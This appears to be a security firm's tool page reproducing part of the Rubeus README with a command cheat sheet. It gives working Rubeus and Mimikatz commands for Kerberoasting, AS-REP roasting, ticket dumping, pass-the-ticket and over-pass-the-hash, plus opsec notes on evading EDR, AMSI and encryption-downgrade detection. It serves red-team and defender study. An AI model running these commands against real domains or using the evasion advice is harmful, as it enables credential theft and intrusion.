+<p>Substitute an sname or SPN into an existing service ticket: Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:ldap [/srealm:DOMAIN] [/ptt] [/luid] [/nowrap] Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:cifs/computer.domain.com [/srealm:DOMAIN] [/ptt] [/luid] [/nowrap]</p>
+<p>Display the current user's LUID: Rubeus.exe currentluid</p>
+<p>Display information about the (current) or (target) logon session, default all readable: Rubeus.exe logonsession [/current] [/luid:X]</p>
+<p>The "/consoleoutfile:C:\FILE.txt" argument redirects all console output to the file specified.</p>
+<p>The "/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function.</p>
+<p>The "/debug" flag outputs ASN.1 debugging information.</p>
+<p>Convert an AS-REP and a key to a Kirbi: Rubeus.exe asrep2kirbi /asrep:&lt;BASE64 | FILEPATH&gt; &lt;/key:BASE64 | /keyhex:HEXSTRING&gt; [/enctype:DES|RC4|AES128|AES256] [/ptt] [/luid:X] [/nowrap]</p>
+<p>Insert new DES session key into a Kirbi: Rubeus.exe kirbi /kirbi:&lt;BASE64 | FILEPATH&gt; /sessionkey:SESSIONKEY /sessionetype:DES|RC4|AES128|AES256 [/ptt] [/luid:X] [outfile:FILENAME] [/nowrap]</p>
+<p>NOTE: Base64 ticket blobs can be decoded with :</p>
+<p>[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("aa..."))</p>
+<h4>Opsec Notes</h4>
+<p>This section covers some notes on the operational security of using Rubeus in an environment, with some technical examples comparing/contrasting some of its approaches to Mimikatz. The material here will be expanded in the future.</p>
+<h4>Overview</h4>
+<p>Any action you perform on a system is a detectable risk, especially when abusing functionality in "weird"/unintended ways. Rubeus (like any attacker toolset) can be detected in a number of methods, either from the host, network, or domain perspectives. I have a workmate who is fond of stating _"everything is stealthy until someone is looking for it"_ - tools and techniques generally evade detection because either a) people are not sufficiently aware of the tool/technique and therefore not even looking, b) people can not collect and process the data needed at the appropriate scale, or c) the tool/technique blends with existing behavior to sufficiently sneak in with false positives in an environment. There is much more information on these steps and detection subversion in general in <a href="https://twitter.com/mattifestation">Matt Graeber</a> and <a href="https://twitter.com/tifkin_">Lee Christensen</a>’s Black Hat USA 2018 <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Graeber-Subverting-Sysmon-Application-Of-A-Formalized-Security-Product-Evasion-Methodology.pdf">“Subverting Sysmon”</a> talk and associated <a href="https://specterops.io/assets/resources/Subverting_Sysmon.pdf">whitepaper</a>.</p>
+<p>From the host perspective, Rubeus can be caught during initial weaponization of the code itself, by an abnormal (non-lsass.exe) process issuing raw Kerberos port 88 traffic, through the use of sensitive APIs like LsaCallAuthenticationPackage(), or by abnormal tickets being present on the host (e.g. rc4\_hmac use in tickets in a modern environment).</p>
+<p>From a network or domain controller log perspective, since Rubeus implements many parts of the normal Kerberos protocol, the main detection method involves the use of rc4\_hmac in Kerberos exchanges. Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges (with a few exceptions like inter-realm trust tickets). Using a rc4\_hmac (NTLM) hash is used in a Kerberos exchange instead of a aes256\_cts\_hmac\_sha1 (or aes128) key results in some signal that is detectable at the host level, network level (if Kerberos traffic is parsed), and domain controller event log level, sometimes known as "encryption downgrade".</p>
+<h4>Weaponization</h4>
+<p>One common way attack tools are detected is through the weaponization vector for the code. If Rubeus is run through PowerShell (this includes Empire) the standard PowerShell V5 protections all apply (deep script block logging, AMSI, etc.). If Rubeus is executed as a binary on disk, standard AV signature detection comes into play (part of why we do not release compiled versions of Rubeus, as brittle signatures are silly ; ). If Rubeus is used as a library then it's susceptible to whatever method the primary tool uses to get running. And if Rubeus is run through unmanaged assembly execution (like Cobalt Strike's <code>execute_assembly</code>) cross-process code injection is performed and the CLR is loaded into a potentially non-.NET process, though this signal is present for the execution of any .NET code using this method.</p>
+<p>Also, AMSI (the Antimalware Scan Interface) has been <a href="https://blogs.msdn.microsoft.com/dotnet/2018/11/28/announcing-net-framework-4-8-early-access-build-3694/">added to .NET 4.8</a>. <a href="https://twitter.com/cobbr_io">Ryan Cobb</a> has additional details on the offensive implications of this in the <strong>Defense</strong> section of his <a href="https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462">“Entering a Covenant: .NET Command and Control”</a> post.</p>
+<h4>Example: Credential Extraction</h4>
+<p>Say we have elevated access on a machine and want to extract user credentials for reuse.</p>
+<p>Mimikatz is the swiss army knife of credential extraction, with multiple options. The <code>sekurlsa::logonpasswords</code> command will open up a <a href="https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L168">read handle to LSASS</a>, enumerate logon sessions present on the system, walk the default authentication packages for each logon session, and extract any reverseable password/credential material present. <strong>Sidenote</strong>: the <code>sekurlsa::ekeys</code> command will enumerate ALL key types present for the Kerberos package.</p>
+<p>Rubeus doesn't have any code to touch LSASS (and none is intended), so its functionality is limited to extracting Kerberos tickets through use of the LsaCallAuthenticationPackage() API. From a non-elevated standpoint, the session keys for TGTs are not returned (by default) so only service tickets extracted will be usable (the <strong>tgtdeleg</strong> command uses a Kekeo trick to get a usable TGT for the current user). If in a high-integrity context, a <a href="https://github.com/GhostPack/Rubeus/blob/4c9145752395d48a73faf326c4ae57d2c565be7f/Rubeus/lib/Helpers.cs#L55-L107">GetSystem</a> equivalent utilizing token duplication is run to elevate to SYSTEM, and a fake logon application is registered with the LsaRegisterLogonProcess() API call. This allows for privileged enumeration and extraction of all tickets currently registered with LSA on the system, resulting in base64 encoded .kirbi's being output for later reuse.</p>
+<p>Mimikatz can perform the same base64 .kirbi extraction with the following series of commands:</p>
+<p>mimikatz # privilege::debug mimikatz # token::elevate mimikatz # standard::base64 /output:true mimikatz # kerberos::list /export</p>
+<p>Mimikatz can also carve tickets directly out of LSASS' memory with:</p>
+<p>mimikatz # privilege::debug mimikatz # standard::base64 /output:true mimikatz # sekurlsa::tickets /export</p>
+<p>As "everything is stealthy until someone is looking for it", it's arguable whether LSASS manipulation or ticket extraction via the LsaCallAuthenticationPackage() API call is more "stealthy". Due to Mimikatz' popularity, opening up a handle to LSASS and reading/writing its memory has become a big target for EDR detection and/or prevention. However, LsaCallAuthenticationPackage() is used by a fairly limited set of processes, and creating a fake logon application with LsaRegisterLogonProcess() is also fairly anomalous behavior. However full API level introspection and baselining appears to be a more difficult technical problem than LSASS protection.</p>
+<h4>Example: Over-pass-the-hash</h4>
+<p>Say we recover a user's rc4\_hmac hash (NTLM) and want to reuse this credential to compromise an additional machine where the user account has privileged access.</p>
+<p><strong>Sidenote:</strong> pass-the-hash != over-pass-the-hash. The traditional pass-the-hash technique involves reusing a hash through the NTLMv1/NTLMv2 protocol, which doesn't touch Kerberos at all. The over-pass-the-hash approach was developed by <a href="https://twitter.com/gentilkiwi">Benjamin Delpy</a> and <a href="https://twitter.com/passingthehash">Skip Duckwall</a> (see their <a href="https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18">"Abusing Microsoft Kerberos - Sorry you guys don't get it"</a> presentation for more information). This approach turns a hash/key (rc4\_hmac, aes256\_cts\_hmac\_sha1, etc.) for a domain-joined user into a fully-fledged ticket-granting-ticket (TGT).</p>
+<p>Let's compare "over-passing-the-hash" via Mimikatz' <code>sekurlsa::pth</code> command verus using the <code>asktgt</code> command from Rubeus (or <a href="https://github.com/gentilkiwi/kekeo/">Kekeo</a> if you'd like).</p>
+<p>When <code>sekurlsa::pth</code> is used to over-pass-the-hash, Mimikatz first creates a new <a href="https://github.com/gentilkiwi/mimikatz/blob/3d8be22fff9f7222f9590aa007629e18300cf643/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L926">logon type 9 process</a> with dummy credentials - this creates a new "sacrificial" logon session that doesn't interact with the current logon session. It then opens the LSASS process with the ability to write to process memory, and the supplied hash/key is then <a href="https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c#L566-L600">patched into the appropriate section</a> for the associated logon session (in this case, the "sacrificial" logon session that was started). This causes the normal Kerberos authentication process to kick off as normal as if the user had normally logged on, turning the supplied hash into a fully-fledged TGT.</p>
+<p>When Rubeus' <code>asktgt</code> command is run (or Kekeo's equivalent), the raw Kerberos protocol is used to request a TGT, which is then applied to the current logon session if the <code>/ptt</code> flag is passed.</p>
+<p>With the Mimikatz approach, administrative rights are needed as you are manipulating LSASS memory directly. As previously mentioned, Mimikatz' popularity has also led to this type of behavior (opening up a handle to LSASS and reading/writing its memory) being a big target for EDR detection and/or prevention. With the Rubeus/Kekeo approach, administrative rights are not needed as LSASS is not being touched. However, if the ticket is applied to the current logon session (with <code>/ptt</code>), the TGT for the current logon session will be overwritten. This behavior can be avoided (with administrative access) by using the <code>/createnetonly</code> command to create a sacrificial process/logon session, then using <code>/ptt /ticket:X /luid:0xa..</code> with the newly created process LUID. If using Cobalt Strike, using the <strong>make\_token</strong> command with dummy credentials and then <strong>kerberos\_ticket\_use</strong> with the ticket retrieved by Rubeus will let you apply the new TGT in a way that a) doesn't need administrative rights and b) doesn't stomp on the current logon session TGT.</p>
+<p>It is our opinion that the LSASS manipulation approach is more likely (at the current moment) to be detected or mitigated due to the popularity of the technique. However the Rubeus approach does result in another piece of detectable behavior. Kerberos traffic to port 88 should normally only originate from lsass.exe - sending raw traffic of this type from an abnormal process could be detectable if the information can be gathered.</p>
+<p><strong>Sidenote</strong>: one way _both_ approaches can potentially be caught is the previously mentioned "encryption downgrade" detection. To retrieve AES keys, use Mimikatz' <code>sekurlsa::ekeys</code> module to return ALL Kerberos encryption keys (same with <code>lsadump::dcsync</code>) which are better to use when trying to evade some detections.</p>
+  <p class="small">Trimmed to the first part of the upstream README so the page stays inside the byte ceiling. The command reference below is complete.</p>
+  <h2>Commands</h2>
+<ul class="facts"><li><strong>Type</strong> C# Tool</li><li><strong>Purpose</strong> Kerberos abuse and manipulation</li><li><strong>Platform</strong> Windows</li><li><strong>Tags</strong> #windows #kerberos #active-directory #post-exploitation #tickets</li></ul>
+<h3>Quick Reference</h3>
+<pre><code># Kerberoasting
+Rubeus.exe kerberoast /outfile:hashes.txt
+
+# AS-REP Roasting
+Rubeus.exe asreproast /outfile:asrep-hashes.txt
+
+# Request TGT
+Rubeus.exe asktgt /user:username /password:password /domain:company.com
+
+# Pass-the-Ticket
+Rubeus.exe ptt /ticket:base64-ticket
+
+# Dump tickets
+Rubeus.exe dump
+
+# Monitor for new logons
+Rubeus.exe monitor /interval:10</code></pre>
+<h3>Kerberoasting</h3>
+<pre><code># Kerberoast all SPNs
+Rubeus.exe kerberoast /outfile:kerberoast.txt
+
+# Specific user
+Rubeus.exe kerberoast /user:serviceaccount
+
+# Target specific SPN
+Rubeus.exe kerberoast /spn:MSSQLSvc/server.company.com</code></pre>
+<h3>AS-REP Roasting</h3>
+<pre><code># Find and roast AS-REP roastable users
+Rubeus.exe asreproast /outfile:asrep.txt
+
+# Specific user
+Rubeus.exe asreproast /user:username</code></pre>
+<h3>Ticket Operations</h3>
+<pre><code># Request TGT
+Rubeus.exe asktgt /user:admin /password:pass /domain:company.com
+
+# Request TGS
+Rubeus.exe asktgs /service:cifs/server.company.com /ticket:base64-tgt
+
+# Pass-the-Ticket
+Rubeus.exe ptt /ticket:base64-ticket
+
+# Dump all tickets
+Rubeus.exe dump /service:krbtgt
+
+# Purge tickets
+Rubeus.exe purge</code></pre>
+<h3>Pro Tips</h3>
+<p>💡 <strong>Pure Kerberos</strong>: Doesn't touch LSASS (stealthier than mimikatz) 💡 <strong>No Admin Required</strong>: Most operations don't need elevated privileges 💡 <strong>Kerberoasting</strong>: Offline cracking of service account passwords 💡 <strong>AS-REP</strong>: Targets accounts without Kerberos pre-auth 💡 <strong>Monitoring</strong>: Can monitor for new TGTs in real-time</p>
+<h3>Note</h3>
+<p>Windows AD tool, included for comprehensive coverage. For Azure Kerberos operations, see AADInternals.</p>
+<h3>Resources</h3>
+<ul>
+<li>GitHub: <a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></li>
+<li>Author: @harmj0y (Will Schroeder) / GhostPack</li>
+</ul>
+  <p class="licence">Captured from <a href="https://github.com/AzureFactory/Azure_Offensive_Tooling">AzureFactory/Azure_Offensive_Tooling</a> on 22 Nov 2026. Upstream content, reproduced as captured; each tool keeps its own licence. Private, all rights reserved.</p>
+  <p class="action"><a href="/tools/">All tools</a> &rarr;</p>
+  <p class="small">Elsewhere &middot; <a href="https://breachcraftsecurity.com/">Services</a> &middot; <a href="https://breachcraft.academy/">Academy</a> &middot; <a href="https://breachcraft.app/">Labs</a> &middot; <a href="https://breachcraft.org/">Standards</a></p>
+  <p class="small">Breachcraft Security &middot; Evilsaint Ltd &middot; <a href="mailto:hello@breachcraftsecurity.com">hello@breachcraftsecurity.com</a></p>
+</main>
+</body>
+</html>
